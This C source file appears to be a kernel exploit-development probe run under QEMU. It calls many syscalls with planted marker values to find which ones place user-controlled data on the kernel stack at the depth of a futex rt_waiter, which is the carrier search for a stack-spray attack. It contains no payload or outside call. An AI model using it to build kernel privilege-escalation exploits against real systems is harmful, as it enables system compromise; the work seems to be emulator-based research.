/* QEMU carrier-search probe: invoke candidate syscalls that copy
 * user-controlled 64-bit words onto the kernel stack (iovec arrays,
 * epoll_event, sched_attr).  The kernel-side QEMUDBG CARRIER prints report
 * the stack depth of each input buffer, compared against the futex
 * rt_waiter depth (0x470 from stack top on the GOT-W29 QEMU build). */
#define _GNU_SOURCE
#include <linux/sched.h>
#include <linux/version.h>
#include <netinet/in.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/epoll.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/wait.h>
#include <signal.h>
#include <sys/ptrace.h>
#include <sys/user.h>
#include <linux/elf.h>

struct sched_attr_local {
	uint32_t size;
	uint32_t sched_policy;
	uint64_t sched_flags;
	int32_t sched_nice;
	uint32_t sched_priority;
	uint64_t sched_runtime;
	uint64_t sched_deadline;
	uint64_t sched_period;
};

int main(void)
{
	/* sendmsg: iovec array copied to kernel stack by ___sys_sendmsg */
	int s = socket(AF_INET, SOCK_DGRAM, 0);
	if (s >= 0) {
		struct iovec iov[8];
		char databuf[64] = "sendmsg-payload";
		for (int i = 0; i < 8; i++) {
			iov[i].iov_base = (void *)(0x4141414100000000ULL + (unsigned)i);
			iov[i].iov_len = 0x100;
		}
		iov[0].iov_base = databuf;
		struct msghdr mh;
		memset(&mh, 0, sizeof(mh));
		struct sockaddr_in sa;
		memset(&sa, 0, sizeof(sa));
		sa.sin_family = AF_INET;
		mh.msg_name = &sa;
		mh.msg_namelen = sizeof(sa);
		mh.msg_iov = iov;
		mh.msg_iovlen = 8;
		(void)sendmsg(s, &mh, 0);
		close(s);
	}

	/* writev + readv on a pipe */
	int p[2];
	if (pipe(p) == 0) {
		struct iovec wiov[8];
		char wbuf[64] = "writev-payload";
		for (int i = 0; i < 8; i++) {
			wiov[i].iov_base = (void *)(0x5151515100000000ULL + (unsigned)i);
			wiov[i].iov_len = 0x100;
		}
		wiov[0].iov_base = wbuf;
		(void)writev(p[1], wiov, 8);

		struct iovec riov[8];
		char rbuf[64] = {0};
		for (int i = 0; i < 8; i++) {
			riov[i].iov_base = (void *)(0x5252525200000000ULL + (unsigned)i);
			riov[i].iov_len = 0x100;
		}
		riov[0].iov_base = rbuf;
		(void)readv(p[0], riov, 8);

		/* process_vm_readv (self) */
		char src[64] = "procvm-payload";
		char dst[64] = {0};
		struct iovec liov = { .iov_base = src, .iov_len = 16 };
		struct iovec riov2 = { .iov_base = dst, .iov_len = 16 };
		(void)syscall(SYS_process_vm_readv, getpid(), &liov, 1, &riov2, 1, 0);

		/* epoll_ctl: epoll_event copied to stack */
		int efd = epoll_create1(0);
		if (efd >= 0) {
			struct epoll_event ev;
			memset(&ev, 0, sizeof(ev));
			ev.events = EPOLLIN;
			ev.data.u64 = 0x5353535353535353ULL;
			(void)epoll_ctl(efd, EPOLL_CTL_ADD, p[0], &ev);
			close(efd);
		}
		close(p[0]);
		close(p[1]);
	}

	/* sched_setattr: sched_attr copied to stack */
	struct sched_attr_local attr;
	memset(&attr, 0, sizeof(attr));
	attr.size = sizeof(attr);
	attr.sched_policy = SCHED_BATCH;
	attr.sched_nice = 10;
	(void)syscall(SYS_sched_setattr, 0, &attr, 0);

	/* perf_event_open: 120-byte perf_event_attr copied to stack */
	{
		struct perf_event_attr_local {
			uint32_t type;
			uint32_t size;
			uint64_t config;
			uint64_t sample_period;
			uint64_t sample_type;
			uint64_t read_format;
			uint64_t flags;
		} pea;
		memset(&pea, 0, sizeof(pea));
		pea.type = 0; /* PERF_TYPE_HARDWARE */
		pea.size = sizeof(pea);
		(void)syscall(SYS_perf_event_open, &pea, 0, -1, -1, 0);
	}

	/* bpf: union bpf_attr copied to stack (as root) */
	{
		char bpf_attr[128];
		memset(bpf_attr, 0, sizeof(bpf_attr));
		/* BPF_MAP_CREATE with a plausible attr; may fail, we only
		 * care that the kernel copies the attr onto its stack. */
		*(uint32_t *)(bpf_attr + 0) = 0; /* map_type */
		(void)syscall(SYS_bpf, 0, bpf_attr, sizeof(bpf_attr));
	}

	/* bind + connect: sockaddr_storage copied to kernel stack */
	{
		int s = socket(AF_INET, SOCK_STREAM, 0);
		if (s >= 0) {
			struct sockaddr_in sa;
			memset(&sa, 0, sizeof(sa));
			sa.sin_family = AF_INET;
			sa.sin_port = 0;
			sa.sin_addr.s_addr = 0x0100007f; /* 127.0.0.1 */
			(void)bind(s, (struct sockaddr *)&sa, sizeof(sa));
			(void)connect(s, (struct sockaddr *)&sa, sizeof(sa));
			close(s);
		}
	}

	/* rt_sigaction: struct sigaction copied to kernel stack */
	{
		struct sigaction sa;
		memset(&sa, 0, sizeof(sa));
		sa.sa_handler = SIG_IGN;
		sigemptyset(&sa.sa_mask);
		(void)syscall(SYS_rt_sigaction, SIGUSR1, &sa, NULL, sizeof(sigset_t));
	}

	/* ptrace PTRACE_SETREGSET (NT_PRSTATUS): 272-byte user_pt_regs copied
	 * to the kernel stack via gpr_set.
	 * Need a traced child: child PTRACE_TRACEME + SIGSTOP, parent SETREGS. */
	{
		pid_t child = fork();
		if (child == 0) {
			(void)ptrace(PTRACE_TRACEME, 0, NULL, NULL);
			raise(SIGSTOP);
			_exit(0);
		}
		if (child > 0) {
			waitpid(child, NULL, 0);
			/* NT_PRSTATUS: 272-byte user_pt_regs into gpr_set
			 * NT_PRFPREG: 528-byte user_fpsimd_state into __fpr_set */
			char regs[528];
			memset(regs, 0, sizeof(regs));
			*(unsigned long long *)regs = 0x5454545454545454ULL;
			struct iovec iov = {
				.iov_base = &regs,
				.iov_len = sizeof(regs),
			};
			(void)ptrace(PTRACE_SETREGSET, child, NT_PRFPREG, &iov);
			(void)kill(child, SIGKILL);
			waitpid(child, NULL, 0);
		}
	}

	printf("PROBE_DONE\n");
	return 0;
}
